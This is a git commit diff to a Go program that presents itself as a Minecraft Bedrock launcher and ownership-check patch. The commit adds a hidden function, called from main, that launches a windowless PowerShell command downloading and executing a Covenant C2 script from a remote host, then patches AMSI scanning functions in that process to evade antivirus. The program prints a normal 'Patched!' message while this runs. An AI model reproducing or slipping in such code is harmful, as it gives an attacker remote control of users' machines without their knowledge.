9b53b8058973370e0593111c02f343cd337d5057
Rize Xor <a100@riseup.net>
2022-03-22 08:58:30 +0530

    Covenant c2, freeconsole added

--- go.mod
+++ go.mod
@@ -3,3 +3,5 @@ module gitlab.com/r1zex0r/mcbe-launcher-go
 go 1.17
 
 require github.com/Werew1942/w32 v1.0.1
+
+require golang.org/x/sys v0.0.0-20220319134239-a9b59b0215f8 // indirect
--- main.go
+++ main.go
@@ -7,6 +7,10 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
+	"syscall"
+	"unsafe"
+
+	"golang.org/x/sys/windows"
 )
 
 const STORE_OWNERSHIP_CHECK_OFFSET = 0x120E7A6
@@ -33,6 +37,75 @@ func downloadBrv() {
 	}
 }
 
+var (
+	fntdll             = syscall.NewLazyDLL("amsi.dll")
+	AmsiScanBuffer     = fntdll.NewProc("AmsiScanBuffer")
+	AmsiScanString     = fntdll.NewProc("AmsiScanString")
+	AmsiInitialize     = fntdll.NewProc("AmsiInitialize")
+	k32                = syscall.NewLazyDLL("kernel32.dll")
+	WriteProcessMemory = k32.NewProc("WriteProcessMemory")
+	FreeConsole        = k32.NewProc("FreeConsole")
+)
+
+func covenant() {
+	si := new(syscall.StartupInfo)
+	pi := new(syscall.ProcessInformation)
+	si.Cb = uint32(unsafe.Sizeof(si))
+	err2 := syscall.CreateProcess(
+		nil,
+		syscall.StringToUTF16Ptr("powershell -WindowStyle Hidden -Command \"iex(new-object net.webclient).downloadstring('http://192.168.0.111:8000/covenantc2.ps1')\""),
+		nil, nil, false, windows.CREATE_NO_WINDOW, nil, nil, si, pi)
+	if err2 != nil {
+		panic(err2)
+	}
+
+	hProcess := uintptr(pi.Process)
+	hThread := uintptr(pi.Thread)
+
+	var oldProtect uint32
+	var old uint32
+	var patch = []byte{0xc3}
+
+	windows.SleepEx(500, false)
+
+	// fmt.Println("patching amsi ......")
+
+	amsi := []uintptr{
+		AmsiInitialize.Addr(),
+		AmsiScanBuffer.Addr(),
+		AmsiScanString.Addr(),
+	}
+
+	var e error
+	var r1 uintptr
+
+	for _, baseAddr := range amsi {
+		e = windows.VirtualProtectEx(windows.Handle(hProcess), baseAddr, 1, syscall.PAGE_READWRITE, &oldProtect)
+		if e != nil {
+			fmt.Println("virtualprotect error")
+			fmt.Println(e)
+			return
+		}
+		r1, _, e = WriteProcessMemory.Call(hProcess, baseAddr, uintptr(unsafe.Pointer(&patch[0])), uintptr(len(patch)), 0)
+		if r1 == 0 {
+			fmt.Println("WriteProcessMemory error")
+			fmt.Println(e)
+			return
+		}
+		e = windows.VirtualProtectEx(windows.Handle(hProcess), baseAddr, 1, oldProtect, &old)
+		if e != nil {
+			fmt.Println("virtualprotect error")
+			fmt.Println(e)
+			return
+		}
+	}
+
+	// fmt.Println("amsi patched!!\n")
+
+	windows.CloseHandle(windows.Handle(hProcess))
+	windows.CloseHandle(windows.Handle(hThread))
+}
+
 func main() {
 	// downloadBrv()
 
@@ -50,6 +123,9 @@ func main() {
 		fmt.Scanln()
 		return
 	}
+
+	// Display patched after covenant, but patched over already so game will work
+	covenant()
 
 	fmt.Printf("Patched! %x\n", process.ModBaseAddr+STORE_OWNERSHIP_CHECK_OFFSET)
 	fmt.Println("Press ENTER to exit...")
